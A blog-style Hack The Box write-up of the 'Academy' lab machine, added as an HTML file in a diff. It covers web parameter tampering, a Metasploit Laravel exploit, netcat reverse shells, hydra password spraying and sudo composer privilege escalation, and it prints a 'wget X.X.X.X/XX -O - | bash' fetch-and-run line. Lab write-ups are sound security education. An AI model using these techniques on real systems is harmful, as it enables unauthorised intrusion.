@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <style>
+      hr {
+        background-color: #D2D4D5;
+        height: 2px;
+        border: 0px;
+      }
+      .container{
+        margin-left:120px;
+        margin-right:120px;
+      }
+      div{
+        font-family: Bahnschrift condensed;
+        font-size:20px;
+      }
+      mark{
+        background-color: #F3CED7;
+        color: #F65B81;
+      }
+      a {
+        color: black;
+        text-decoration: none;
+      }
+      p {
+        font-family: Bahnschrift condensed;
+        font-size:20px;
+      }
+      .grid-container {
+        grid-template-columns: 75px 75px 75px;
+        grid-template-rows: 20px;
+      }
+    </style>
+    <title>HTB Academy Writeup</title>
+  </head>
+  <body class="container">
+    <header>
+      <div class="grid-container">
+        <a href="index.html" align="left">| Home |</a><!--
+        --><a href="about.html" align="left"> About |</a><!--
+        --><a href="writeups.html" align="left"> Writeups |</a>
+      </div>
+      <h1 style="color: #384B60"><center>Hack The Box Writeup: Academy</center></h1>
+      <center><div style="color: #384B60">12/3/2020</div></center>
+      <hr/>
+    </header>
+    <article style="margin-top:60px">
+      <div style="font-size: 25px">Introduction:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <img src="pictures/academy/profile.png" alt="academy" style="width:45%">
+      <div>Hi guys im back with another writeup on Academy.</div>
+      <div>I've been focusing on binary exploitation and school work lately so didn't have much time to do boxes.</div>
+      <div>Academy is a pretty easy but fun box, that requires you to exploit a web application to get foothold and dig up a password to get user.
+      Once you become user, you are given access to some logs, which you can parse and move laterally to another user.
+      This time, you are given sudo privileges, which you can use to your advantage and get a root shell.</div>
+      <br/>
+      <div style="font-size: 25px">Nmap:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div>As usual, let's start with a <mark>nmap</mark> scan on our target:</div>
+      <br/>
+      <img src="pictures/academy/nmap.png" alt="Nmap" style="width:68%">
+      <div><mark>nmap</mark> shows us that only three ports are open. port 22 running <mark>ssh</mark>, port 80 running <mark>http</mark> and port 33060 running <mark>mysqlx</mark>.</div>
+      <div>Let's run nmap again with the <mark>-A</mark> flag to intensively scan these ports, while we go ahead and look at the webpage.</div>
+      <br/>
+      <div style="font-size: 25px">Web Enumeration:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <img src="pictures/academy/server-not-found.png" alt="n" style="width:95%">
+      <div>Navigating to <mark>http://10.10.10.215</mark>, we get an error saying "server not found".</div>
+      <div>However, the url tells us that we got redirected to <mark>http://academy.htb</mark>, which was not in our hosts file and thus could not be resolved.</div>
+      <br/>
+      <div>To help firefox resolve this domain, we just need to add an entry in <mark>/etc/hosts</mark>.</div>
+      <img src="pictures/academy/add-domain.png" alt="add" style="width:48%">
+      <div>Now we should be able to view the page when we navigate to it.</div>
+      <img src="pictures/academy/homepage.png" alt="h" style="width:95%">
+      <div>We see a simple home page that allows us to login and register.</div>
+      <br/>
+      <div>Let's set up a <mark>ffuf</mark> scan in the background, then try to register an account and log in.</div>
+      <img src="pictures/academy/register-acc.png" alt="r" style="width:40%">
+      <div>I registered an account with the username <mark>testacc</mark> and password <mark>testacc</mark>.</div>
+      <br/>
+      <div>However when I log in, I got an account belonging to <mark>egre55</mark>.</div>
+      <img src="pictures/academy/loggedin.png" alt="r" style="width:95%">
+      <div>I tried registering different usernames but still got the same account.</div>
+      <div>At this point I thought either the page is static, or there are some other ways of determining your account name.</div>
+      <br/>
+      <div>I'll send the request through <mark>burp suite</mark> to see what exactly is going on.</div>
+      <img src="pictures/academy/roleid.png" alt="r" style="width:75%">
+      <div>And indeed, there is a <mark>roleid</mark> parameter that is set to 0 for every account we register.</div>
+      <div>I tried changing it to <mark>-1</mark> but it didn't trigger anything.</div>
+      <br/>
+      <div>My next step will be to create a bunch of accounts with different roleid's and check if anything interesting happens.</div>
+      <img src="pictures/academy/pitchfork.png" alt="r" style="width:95%">
+      <img src="pictures/academy/payload.png" alt="r" style="width:95%">
+      <div>I'll set up a pitchfork attack in <mark>burp suite</mark> to do that.</div>
+      <br/>
+      <div>We can take a look at our <mark>ffuf</mark> scan results while the attack is running.</div>
+      <img src="pictures/academy/ffuf.png" alt="r" style="width:95%">
+      <div>Seems like there is an <mark>admin.php</mark> page present. Let's check it out.</div>
+      <img src="pictures/academy/adminlogin.png" alt="r" style="width:95%">
+      <div>This should be the administrator login page.</div>
+      <br/>
+      <div>I wrote a python script to test if any of the accounts have something different.</div>
+      <img src="pictures/academy/script.png" alt="r" style="width:75%">
+      <div>The script will notify us if any accounts are able to log in to the admin page, or if the account name changes.</div>
+      <img src="pictures/academy/found.png" alt="r" style="width:55%">
+      <div>Seems like <mark>roleid=1</mark> has something to offer!</div>
+      <br/>
+      <div>Let's try to log in to the admin page.</div>
+      <img src="pictures/academy/devstaging.png" alt="r" style="width:95%">
+      <div>and it works! We now see a page that seems like a task planner.</div>
+      <br/>
+      <div>Reading through the tasks, we find a subdomain <mark>dev-staging-01.academy.htb</mark>.</div>
+      <div>Let's again add it to our hosts file.</div>
+      <img src="pictures/academy/add-subdomain.png" alt="r" style="width:48%">
+      <div>Now we can navigate to this site.</div>
+      <br/>
+      <div><mark>dev-staging-01.academy.htb</mark>:</div>
+      <img src="pictures/academy/devstaging-error.png" alt="r" style="width:95%">
+      <div>We just see a pretty messy error page.</div>
+      <br/>
+      <div>However if we spend some time to read through, we can find a ton of interesting information.</div>
+      <img src="pictures/academy/laravel.png" alt="r" style="width:60%">
+      <div>We can deduce that the site most likely runs <mark>laravel</mark>, a <mark>PHP</mark> web development framework.</div>
+      <img src="pictures/academy/moreinfo.png" alt="r" style="width:75%">
+      <img src="pictures/academy/environmentvar.png" alt="r" style="width:65%">
+      <div>We also get very sensitive information such as the webroot directory, laravel's app key and even database credentials.</div>
+      <br/>
+      <div>Now let's try searching for vulnerabilities with <mark>searchsploit</mark>.</div>
+      <img src="pictures/academy/searchsploit.png" alt="r" style="width:95%">
+      <div>I was unable to find out the version of <mark>laravel</mark> this site is using, so let's just give the highest version a try.</div>
+      <br/>
+      <div>Let's boot up <mark>metasploit</mark> and locate the module.</div>
+      <img src="pictures/academy/laravel-msf.png" alt="r" style="width:95%">
+      <div><mark>metasploit</mark> is really user friendly, and we can just fill in the relevant information.</div>
+      <div>Remember to set the <mark>VHOST</mark> as <mark>dev-staging-01.academy.htb</mark> so the exploit can be fired at the correct target.</div>
+      <img src="pictures/academy/getshell.png" alt="r" style="width:95%">
+      <div>Launch the exploit, and we get an interactive shell.</div>
+      <br/>
+      <div>This shell is pretty bad though. I'll prefer a proper <mark>netcat</mark> reverse shell with tab completion and ability to clear screen.</div>
+      <div>We can upgrade the shell by sending it to <mark>netcat</mark> and using the <a style="color: blue;" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys">stty trick</a>.</div>
+      <img src="pictures/academy/upgradeshell.png" alt="r" style="width:70%">
+      <img src="pictures/academy/bettershell.png" alt="r" style="width:70%">
+      <div>Now we have a fully interactive shell on the machine as <mark>www-data</mark>.</div>
+      <br/>
+      <div style="font-size: 25px">Getting User:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div>As always let's run <mark>linpeas.sh</mark> to enumerate the system.</div>
+      <img src="pictures/academy/linpeas.png" alt="r" style="width:95%">
+      <div>I hosted a webserver locally with <mark>python</mark> and transferred the script with <mark>wget</mark>.</div>
+      <div>A good practice is to use <mark>wget X.X.X.X/XX -O - | bash</mark> when transferring shell scripts to run, to prevent dropping the script to disk.</div>
+      <br/>
+      <div>The script found some usernames, passwords and interesting information.</div>
+      <div>users:</div>
+      <img src="pictures/academy/users.png" alt="r" style="width:45%">
+      <div>Users can also be found manually by looking at the <mark>/etc/passwd</mark> file.</div>
+      <img src="pictures/academy/sudo_as_admin.png" alt="r" style="width:45%">
+      <div><mark>egre55</mark> has <mark>sudo</mark> capabilities, so he might be a valuable target to move laterally to.</div>
+      <br/>
+      <div>passwords:</div>
+      <img src="pictures/academy/passwordfound.png" alt="r" style="width:55%">
+      <img src="pictures/academy/morepassword.png" alt="r" style="width:95%">
+      <div>Some of these are just default passwords for testing, but since we are doing a ctf it doesn't hurt to try.</div>
+      <br/>
+      <div>We can generate a username list and a password list with these information.</div>
+      <img src="pictures/academy/lists.png" alt="r" style="width:55%">
+      <div>The next step will be to test for password re-use with <mark>hydra</mark>.</div>
+      <br/>
+      <div>hydra against ssh:</div>
+      <img src="pictures/academy/user1pwned.png" alt="r" style="width:95%">
+      <div>We get a working set of credentials <mark>cry0l1t3:mySup3rP4s5w0rd!!</mark>.</div>
+      <img src="pictures/academy/usergetin.png" alt="r" style="width:85%">
+      <div>and now we can just <mark>ssh</mark> in and get the user flag.</div>
+      <br/>
+      <div style="font-size: 25px">Getting Root:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div>I'll run <mark>linpeas.sh</mark> again with this user.</div>
+      <img src="pictures/academy/logs.png" alt="r" style="width:65%">
+      <div>Our current user is able to read some logs.</div>
+      <br/>
+      <div>Let's transfer the logs back to our machine with <mark>scp</mark>.</div>
+      <img src="pictures/academy/scp.png" alt="r" style="width:95%">
+      <div>Now we can decompress the logs and try to extract some information from them.</div>
+      <br/>
+      <div>I'm mainly interested in the audit logs, as it records events and activities happening in the system.</div>
+      <img src="pictures/academy/audit-log-format.png" alt="r" style="width:95%">
+      <div>Commands ran by users are recorded in the <mark>comm</mark> field.</div>
+      <div>Data passed to the commands will be recorded in a <mark>data</mark> field as <mark>hex</mark>.</div>
+      <br/>
+      <div>We can try grepping for commands that require passwords, like <mark>sudo</mark> or <mark>su</mark>.</div>
+      <img src="pictures/academy/decode-pass.png" alt="r" style="width:95%">
+      <div>With some grep-fu, we get another password.</div>
+      <br/>
+      <div>Let's add this password to our list and try to spray it again with <mark>hydra</mark>.</div>
+      <img src="pictures/academy/newpasswd.png" alt="r" style="width:85%">
+      <img src="pictures/academy/user2.png" alt="r" style="width:85%">
+      <div>Now we have another set of credentials that can be used to <mark>ssh</mark> in as <mark>mrb3n</mark>.</div>
+      <br/>
+      <div>The first thing I'll always check for is sudo privileges.</div>
+      <img src="pictures/academy/composer.png" alt="r" style="width:85%">
+      <div>We see that <mark>mrb3n</mark> can run composer as <mark>root</mark>.</div>
+      <div><mark>composer</mark> is a dependency manager for <mark>PHP</mark>, that can be used to run scripts.</div>
+      <img src="pictures/academy/gtfobins.png" alt="r" style="width:65%">
+      <div>A quick search on <a style="color:blue;" href="https://gtfobins.github.io/">gtfobins</a> tells us how to execute arbitrary commands with it.</div>
+      <br/>
+      <div>I'll change the payload to get a working <mark>netcat</mark> reverse shell.</div>
+      <img src="pictures/academy/rootscript.png" alt="r" style="width:95%">
+      <div>run it</div>
+      <img src="pictures/academy/rooted.png" alt="r" style="width:65%">
+      <div>and we are root!</div>
+      <br/>
+      <div style="font-size: 25px">Conclusion:</div>
+      <hr align="left" width="180px">
+      <br/>
+      <div>Academy is a pretty easy box that doesn't involve complex exploits, but instead touches more on the importance of proper enumeration.</div>
+      <div>Sometimes it's easy to overlook the output of tools and their capabilities, and this box definitely helped me to better understand the tools I use.</div>
+      <div>Once again this emphasized the saying "information gathering is the nature of penetration testing".</div>
+      <div>Thanks to the creators of the machine and HTB for hosting it~.</div>
+      <br/>
+      <div><center>Thank you for reading!</center></div>
+      <div><center>~chiefpie</center></div>
+    </article>
+  </body>
+</html>
